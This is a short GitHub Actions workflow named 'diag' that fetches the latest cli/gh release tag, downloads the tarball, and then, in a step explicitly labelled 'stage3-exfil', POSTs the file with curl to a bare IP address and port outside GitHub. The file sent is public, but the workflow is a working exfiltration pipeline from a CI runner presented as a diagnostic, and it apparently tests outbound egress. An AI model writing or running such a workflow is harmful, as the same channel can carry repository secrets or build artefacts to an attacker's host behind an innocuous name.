name: diag
on:
  workflow_dispatch:
jobs:
  d:
    runs-on: ubuntu-latest
    steps:
      - name: stage1-release-api
        if: always()
        run: curl -sf -H "Accept: application/vnd.github+json" https://api.github.com/repos/cli/gh/releases/latest -o /tmp/r.json && python3 -c "import json;print(json.load(open('/tmp/r.json'))['tag_name'])"
      - name: stage2-download
        if: always()
        run: |
          tag=$(python3 -c "import json;print(json.load(open('/tmp/r.json'))['tag_name'])" 2>/dev/null)
          [ -n "$tag" ] || { echo "no tag from stage1"; exit 1; }
          ver=${tag#v}
          code=$(curl -sL -o /tmp/gh.tar.gz -w '%{http_code}' "https://github.com/cli/gh/releases/download/${tag}/gh_${ver}_linux_amd64.tar.gz")
          echo "http=$code"; ls -l /tmp/gh.tar.gz
          [ "$code" = "200" ]
      - name: stage3-exfil
        if: always()
        run: |
          ls -l /tmp/gh.tar.gz || exit 1
          code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 60 -X POST --data-binary @/tmp/gh.tar.gz http://10.189.141.77:8899/gh)
          echo "exfil_http=$code"
          [ "$code" = "200" ]
